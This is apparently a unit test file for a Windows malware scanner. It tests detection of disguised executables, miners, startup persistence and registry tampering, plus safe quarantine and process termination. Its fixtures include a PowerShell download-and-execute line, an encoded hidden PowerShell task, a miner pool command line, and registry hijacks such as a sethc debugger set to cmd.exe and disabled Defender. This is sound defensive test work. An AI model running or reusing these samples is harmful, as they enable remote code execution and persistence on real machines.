import os, shutil, subprocess, sys, tempfile, time, unittest
from pathlib import Path

os.environ["SENTINEL_HOME"] = tempfile.mkdtemp(prefix="sentinel_test2_")
sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from core import file_analyzer as fa_mod
from core.file_analyzer import FileAnalyzer, read_company_name
from core.malware_detection import correlate
from core.miner_detector import MinerDetector
from core.models import Finding, RiskLevel
from core.network_analyzer import Connection, MiningPools, NetworkAnalyzer, is_external
from core.process_analyzer import ProcessAnalyzer, ProcessInfo, is_critical_process
from core.quarantine import Quarantine, QuarantineError
from core.registry_analyzer import (FakeRegistry, HKCU, HKLM, IFEO, INET, WINLOGON, RegistryAnalyzer,
                                    RegistryError, RegistryFixer)
from core.scanner import Scanner
from core.startup_analyzer import (StartupAnalyzer, StartupEntry, StartupError, StartupManager, split_command)
from database.database import Database

REAL_PE = next((p for p in (
    "/opt/pipx/shared/lib/python3.12/site-packages/pip/_vendor/distlib/t64.exe",
    sys.executable,
) if p and os.path.exists(p)), None)


def make_test_root(prefix: str) -> Path:
    """Raiz de teste fora de %TEMP% para não acionar heurísticas de "arquivo em temp"."""
    if sys.platform == "win32":
        base = os.environ.get("LOCALAPPDATA") or tempfile.gettempdir()
        return Path(tempfile.mkdtemp(prefix=prefix, dir=base))
    return Path(tempfile.mkdtemp(prefix=prefix))


def make_dir_link(target: Path, link: Path) -> bool:
    """Cria symlink ou junction. Retorna False se o ambiente não permitir."""
    try:
        link.symlink_to(target, target_is_directory=True)
        return True
    except (OSError, NotImplementedError):
        pass
    if sys.platform == "win32":
        import subprocess
        proc = subprocess.run(["cmd", "/c", "mklink", "/J", str(link), str(target)],
                              capture_output=True, text=True)
        return proc.returncode == 0 and link.exists()
    return False


class Base(unittest.TestCase):
    def setUp(self):
        self.root = make_test_root("s2_")
        self.db = Database(self.root / "t.db")
        self.tempdir = self.root / "AppData" / "Local" / "Temp"
        self.tempdir.mkdir(parents=True)

    def tearDown(self):
        try:
            self.db.close()
        finally:
            shutil.rmtree(self.root, ignore_errors=True)


class ScannerTests(Base):
    def make_tree(self):
        (self.tempdir / "fatura.pdf.exe").write_bytes(b"MZ" + b"\0" * 2000)
        (self.root / "Tools").mkdir(exist_ok=True)
        (self.root / "Tools" / "ok.exe").write_bytes(b"MZ" + b"\0" * 2000)
        (self.tempdir / "dropper.ps1").write_text("powershell -enc AAAA; IEX (New-Object Net.WebClient).DownloadString('http://x')")
        (self.tempdir / "notes.txt").write_text("hello")
        (self.tempdir / "photo.jpg").write_bytes(b"MZ" + b"\0" * 100)  # PE disfarçado de imagem

    def test_scan_finds_threats_and_is_incremental(self):
        self.make_tree()
        sc = Scanner(self.db, FileAnalyzer(self.db, set()), workers=2)
        r = sc.run("custom", [self.root])
        paths = {Path(f.path).name: f for f in r.findings}
        self.assertIn("fatura.pdf.exe", paths)
        self.assertIn("dropper.ps1", paths)
        self.assertIn("photo.jpg", paths)
        self.assertGreaterEqual(paths["photo.jpg"].risk, RiskLevel.MEDIO)
        self.assertNotIn("ok.exe", paths)            # sem assinatura sozinho não é detecção
        r2 = sc.run("custom", [self.root])           # incremental: limpos inalterados são pulados
        self.assertGreaterEqual(r2.files_cached, 1)
        self.assertEqual(len(r2.findings), len(r.findings))
        self.assertTrue(self.db.list_findings(r.scan_id))

    def test_cancel(self):
        for i in range(300):
            (self.tempdir / f"f{i}.exe").write_bytes(b"MZ" + os.urandom(50))
        an = FileAnalyzer(self.db, set()); orig = an.analyze; n = [0]
        def counting(path, check_signature=True):
            n[0] += 1
            if n[0] == 10:
                sc.cancel()
            return orig(path, check_signature=check_signature)
        an.analyze = counting
        sc = Scanner(self.db, an, workers=1)
        r = sc.run("custom", [self.root])
        self.assertTrue(r.cancelled)
        self.assertLess(r.files_analyzed, 300)
        self.assertEqual(self.db.list_scans(1)[0]["status"], "cancelled")

    def test_does_not_follow_symlinks_or_junctions(self):
        outside = self.root / "outside"; outside.mkdir()
        (outside / "evil.pdf.exe").write_bytes(b"MZ" + b"\0" * 100)
        scan_dir = self.root / "scan"; scan_dir.mkdir()
        if not make_dir_link(outside, scan_dir / "link"):
            self.skipTest("ambiente não permite criar symlink/junction")
        r = Scanner(self.db, FileAnalyzer(self.db, set())).run("custom", [scan_dir])
        self.assertEqual(r.files_seen, 0)

    def test_known_hash_is_critical(self):
        f = self.tempdir / "x.exe"; f.write_bytes(b"MZ" + b"known" * 50)
        known = {fa_mod.sha256_file(f)}
        r = Scanner(self.db, FileAnalyzer(self.db, known)).run("custom", [f])
        self.assertEqual(r.findings[0].risk, RiskLevel.CRITICO)


@unittest.skipUnless(REAL_PE, "sem PE real disponível")
class PETests(Base):
    def test_real_pe_parses_without_false_positive(self):
        f = self.root / "tool.exe"; shutil.copy(REAL_PE, f)
        self.assertIsNone(FileAnalyzer(self.db, set()).analyze(f, check_signature=False))

    def test_company_name_returns_str_or_none(self):
        self.assertIsInstance(read_company_name(REAL_PE), (str, type(None)))

    def test_real_pe_in_temp_is_flagged_low(self):
        f = self.tempdir / "tool.exe"; shutil.copy(REAL_PE, f)
        r = FileAnalyzer(self.db, set()).analyze(f, check_signature=False)
        self.assertIsNotNone(r)
        self.assertLessEqual(r.risk, RiskLevel.BAIXO)   # só 'em temp': indício fraco


class ProcessTests(Base):
    def test_mimic_in_temp_is_high(self):
        pa = ProcessAnalyzer(FileAnalyzer(self.db, set()), self.db)
        exe = self.tempdir / "svchost.exe"; exe.write_bytes(b"MZ" + b"\0" * 500)
        info = ProcessInfo(pid=999, name="svchost.exe", exe=str(exe), parent_name="explorer.exe")
        f = pa.evaluate(info)
        self.assertGreaterEqual(f.risk, RiskLevel.ALTO)
        codes = {e.code for e in f.evidences}
        self.assertTrue({"proc_mimic", "proc_temp"} <= codes)
        self.assertNotIn("proc_parent", codes)  # imitador fora de System32: regra de pai não se aplica

    def test_high_cpu_alone_is_not_evidence(self):
        pa = ProcessAnalyzer(FileAnalyzer(self.db, set()), self.db)
        info = ProcessInfo(pid=1234, name="render.exe", exe="", cpu_percent=99.0)
        self.assertEqual(pa.evaluate(info).risk, RiskLevel.SEGURO)

    def test_live_snapshot_and_safe_terminate(self):
        pa = ProcessAnalyzer(FileAnalyzer(self.db, set()), self.db)
        infos = pa.snapshot(cpu_interval=0.1, deep=False, signatures="none")
        self.assertTrue(any(i.pid == os.getpid() for i in infos))
        child = subprocess.Popen([sys.executable, "-c", "import time; time.sleep(30)"])
        try:
            ct = next(i.create_time for i in pa.snapshot(0.0, deep=False, signatures="none") if i.pid == child.pid)
            with self.assertRaises(PermissionError):
                pa.terminate(child.pid, ct, confirmed=False)
            with self.assertRaises(PermissionError):
                pa.terminate(child.pid, ct + 100, confirmed=True)   # PID "reutilizado"
            with self.assertRaises(PermissionError):
                pa.terminate(os.getpid(), 0, confirmed=True)        # nunca encerra a si mesmo
            pa.terminate(child.pid, ct, confirmed=True)
            child.wait(timeout=5)
            self.assertIsNotNone(child.returncode)
        finally:
            if child.poll() is None:
                child.kill()
            child.wait()

    def test_critical_detection(self):
        self.assertTrue(is_critical_process("lsass.exe", "", 600))
        self.assertTrue(is_critical_process("csrss.exe", r"C:\Windows\System32\csrss.exe", 500))
        self.assertFalse(is_critical_process("svchost.exe", r"C:\Users\x\AppData\Local\Temp\svchost.exe", 700))


class NetworkMinerTests(Base):
    def conn(self, **kw):
        d = dict(pid=10, process="x.exe", exe=str(self.tempdir / "x.exe"), proto="TCP", laddr="10.0.0.2", lport=50000,
                 raddr="203.0.113.7", rport=3333, status="ESTABLISHED", external=True)
        d.update(kw); return Connection(**d)

    def test_is_external(self):
        self.assertFalse(is_external("192.168.1.5")); self.assertFalse(is_external("127.0.0.1"))
        self.assertTrue(is_external("8.8.8.8"))

    def test_pool_connection_is_strong(self):
        pools = MiningPools(["pool.example"]); pools.ip_to_host["203.0.113.7"] = "pool.example"; pools.resolved = True
        f = NetworkAnalyzer(pools).analyze([self.conn()])[0]
        self.assertEqual(f.category, "Minerador"); self.assertGreaterEqual(f.risk, RiskLevel.ALTO)

    def test_common_traffic_not_flagged(self):
        pools = MiningPools([]); pools.resolved = True
        out = NetworkAnalyzer(pools).analyze([self.conn(rport=443, exe=r"C:\Program Files\App\app.exe")])
        self.assertTrue(all(f.risk <= RiskLevel.SEGURO for f in out))

    def test_miner_requires_multiple_indicators(self):
        pools = MiningPools([]); pools.resolved = True
        md = MinerDetector(pools)
        busy = ProcessInfo(pid=5, name="blender.exe", exe=r"C:\Program Files\Blender\blender.exe", create_time=1.0)
        md.stats[(5, 1.0)] = {"samples": 10, "cpu_avg": 90, "cpu_frac": 1.0, "gpu_avg": 90, "gpu_frac": 1.0}
        self.assertEqual(md.detect([busy], []), [])                          # CPU+GPU altos: nenhum alerta
        bad = ProcessInfo(pid=6, name="svchost.exe", exe=str(self.tempdir / "svchost.exe"), create_time=2.0,
                          cmdline=["svchost.exe", "-o", "stratum+tcp://pool.example:3333", "--donate-level=1"])
        bad.finding = ProcessAnalyzer(FileAnalyzer(self.db, set()), self.db).evaluate(bad, deep=False)
        md.stats[(6, 2.0)] = {"samples": 10, "cpu_avg": 80, "cpu_frac": 1.0, "gpu_avg": 0, "gpu_frac": 0}
        res = md.detect([bad], [self.conn(pid=6, rport=3333)], {str(self.tempdir / "svchost.exe")})
        self.assertEqual(len(res), 1)
        self.assertGreaterEqual(res[0].risk, RiskLevel.ALTO)
        self.assertGreaterEqual(len(res[0].extra["families"]), 3)
        lone = ProcessInfo(pid=7, name="a.exe", exe="", cmdline=["a.exe", "--donate-level=1"])
        r1 = md.detect([lone], [])
        self.assertEqual(r1[0].risk, RiskLevel.MEDIO)                        # uma família só: limitado a MÉDIO

    def test_cpu_sampler_sees_busy_process(self):
        busy = subprocess.Popen([sys.executable, "-c", "while True: pass"])
        try:
            md = MinerDetector(MiningPools([]), cpu_threshold=1.0, use_gpu=False)
            stats = md.sample(duration=2.0, interval=0.5)
            key = next(k for k in stats if k[0] == busy.pid)
            self.assertGreater(stats[key]["cpu_frac"], 0.5)
        finally:
            busy.kill(); busy.wait()


class StartupTests(Base):
    def test_split_command(self):
        self.assertEqual(split_command(r'"C:\Program Files\A\a.exe" /bg'), (r"C:\Program Files\A\a.exe", "/bg"))
        self.assertEqual(split_command(r"C:\Program Files\A\a.exe /bg"), (r"C:\Program Files\A\a.exe", "/bg"))

    def test_temp_persistence_with_encoded_ps(self):
        sa = StartupAnalyzer(FileAnalyzer(self.db, set()), access=FakeRegistry(), db=self.db)
        bad = self.tempdir / "upd.exe"; bad.write_bytes(b"MZ" + b"\0" * 500)
        e1 = StartupEntry("run", "Updater", "HKCU\\...\\Run", f'"{bad}"')
        e2 = StartupEntry("task", "T", "Agendador", "powershell.exe -w hidden -enc AAAA")
        e3 = StartupEntry("run", "App", "HKCU\\...\\Run", r'"C:\Program Files\Nada\app.exe" /bg')
        sa.analyze([e1, e2, e3], deep=True)
        self.assertGreaterEqual(e1.risk, RiskLevel.MEDIO)
        self.assertGreaterEqual(e2.risk, RiskLevel.MEDIO)
        self.assertLessEqual(e3.risk, RiskLevel.BAIXO)

    def test_collect_registry_and_disable_is_reversible(self):
        base = r"SOFTWARE\Microsoft\Windows\CurrentVersion"
        reg = FakeRegistry({(HKCU, base + r"\Run"): {"Updater": r'"C:\x\u.exe"'}})
        sa = StartupAnalyzer(FileAnalyzer(self.db, set()), access=reg, db=self.db)
        entries = sa.collect_registry()
        self.assertEqual(len(entries), 1); self.assertTrue(entries[0].enabled)
        backups = []
        mgr = StartupManager(reg, self.db, backup=lambda h, k: backups.append((h, k)) or Path("b.reg"))
        with self.assertRaises(StartupError):
            mgr.disable(entries[0], confirmed=False)
        mgr.disable(entries[0], confirmed=True)
        self.assertFalse(sa.collect_registry()[0].enabled)         # desativado via StartupApproved
        self.assertIn("Updater", reg.values(HKCU, base + r"\Run"))   # valor original preservado
        mgr.enable(entries[0], confirmed=True)
        self.assertTrue(sa.collect_registry()[0].enabled)

    def test_unevaluated_windows_service_is_still_refused(self):
        # Sem passar por evaluate(), exe fica vazio; o comando ainda deve ser analisado.
        svc = StartupEntry("service", "Spooler", "Serviços", r"C:\Windows\System32\spoolsv.exe")
        self.assertTrue(StartupManager.is_critical(svc))
        with self.assertRaises(StartupError):
            StartupManager(FakeRegistry(), self.db).disable(svc, confirmed=True)

    def test_critical_and_drivers_refused(self):
        mgr = StartupManager(FakeRegistry(), self.db)
        drv = StartupEntry("driver", "d", "Drivers", r"C:\x\d.sys")
        with self.assertRaises(StartupError):
            mgr.disable(drv, confirmed=True, confirm_critical=True)
        svc = StartupEntry("service", "Spooler", "Serviços", r"C:\Windows\System32\spoolsv.exe"); svc.exe = r"C:\Windows\System32\spoolsv.exe"
        with self.assertRaises(StartupError):
            mgr.disable(svc, confirmed=True)


class RegistryTests(Base):
    def bad_registry(self):
        return FakeRegistry({
            (HKLM, WINLOGON): {"Shell": "explorer.exe, evil.exe", "Userinit": r"C:\Windows\system32\userinit.exe,"},
            (HKLM, IFEO + r"\sethc.exe"): {"Debugger": r"C:\Windows\System32\cmd.exe"},
            (HKLM, r"SOFTWARE\Policies\Microsoft\Windows Defender"): {"DisableAntiSpyware": (1, 4)},
            (HKCU, INET): {"ProxyEnable": (1, 4), "ProxyServer": "127.0.0.1:8888"},
            (HKLM, r"SOFTWARE\Classes\exefile\shell\open\command"): {"": r'"C:\evil.exe" "%1"'},
        })

    def test_detects_tampering_and_ignores_clean(self):
        found = {f.path.split("\\")[-1] + ":" + f.evidences[0].code for f in RegistryAnalyzer(self.bad_registry()).analyze()}
        self.assertTrue({"Shell:wl_shell", "Debugger:ifeo_access", "DisableAntiSpyware:pol_def_off",
                         "ProxyEnable:proxy_on", "command:assoc_hijack"} <= found, found)
        clean = FakeRegistry({(HKLM, WINLOGON): {"Shell": "explorer.exe"},
                              (HKLM, r"SOFTWARE\Classes\exefile\shell\open\command"): {"": '"%1" %*'}})
        self.assertEqual(RegistryAnalyzer(clean).analyze(), [])

    def test_fixer_requires_confirmation_backup_and_allowlist(self):
        reg = self.bad_registry(); calls = []
        fixer = RegistryFixer(reg, self.db, backup=lambda h, k: calls.append((h, k)) or Path("b.reg"))
        shell = next(f for f in RegistryAnalyzer(reg).analyze() if f.extra.get("value") == "Shell")
        with self.assertRaises(RegistryError):
            fixer.apply(shell, confirmed=False)
        fixer.apply(shell, confirmed=True)
        self.assertEqual(reg.get(HKLM, WINLOGON, "Shell"), "explorer.exe")
        self.assertEqual(calls[0][1], WINLOGON)                           # backup ANTES da escrita
        forged = Finding(path="x", extra={"fix": {"action": "delete_value", "hive": HKLM, "key": r"SYSTEM\Setup", "value": "x"}})
        with self.assertRaises(RegistryError):
            fixer.apply(forged, confirmed=True)                           # fora da lista de permissões

    def test_defender_exclusions(self):
        class D:
            def exclusions(self): return {"Paths": [str(self.tmp)], "Extensions": [".exe"], "Processes": []}
        d = D(); d.tmp = self.tempdir
        fs = RegistryAnalyzer(FakeRegistry(), d).analyze()
        self.assertEqual(len(fs), 2); self.assertTrue(all(f.score >= 30 for f in fs))


class CorrelationAndSafetyTests(Base):
    def test_persistence_plus_network_needs_other_evidence(self):
        legit = r"C:\Program Files\App\app.exe"
        a = Finding(path=legit, extra={"kind": "startup", "entry_name": "App"}); a.add("sig_valid", "assinado", -10)
        b = Finding(path=legit, extra={"kind": "network", "pids": [1]}); b.add("net_uncommon", "porta", 3)
        self.assertEqual(correlate([[a], [b]]), [])
        bad = str(self.tempdir / "x.exe")
        a2 = Finding(path=bad, extra={"kind": "startup"}); a2.add("st_temp", "temp", 30)
        b2 = Finding(path=bad, extra={"kind": "network", "pids": [2]}); b2.add("net_c2_pattern", "c2", 12)
        out = correlate([[a2], [b2]])
        self.assertEqual(len(out), 1)
        self.assertIn("corr_persist_net", {e.code for e in out[0].evidences})
        self.assertGreaterEqual(out[0].risk, RiskLevel.ALTO)

    def test_program_files_needs_confirmation(self):
        pf = self.root / "Program Files"; pf.mkdir(); os.environ["ProgramFiles"] = str(pf)
        try:
            f = pf / "bad.exe"; f.write_bytes(b"MZ")
            q = Quarantine(self.db, self.root / "q")
            with self.assertRaises(QuarantineError):
                q.quarantine_file(f, allowed_roots=[self.root])
            self.assertTrue(f.exists())
            q.quarantine_file(f, allowed_roots=[self.root], confirmed=True)
            self.assertFalse(f.exists())
        finally:
            del os.environ["ProgramFiles"]


if __name__ == "__main__":
    unittest.main()
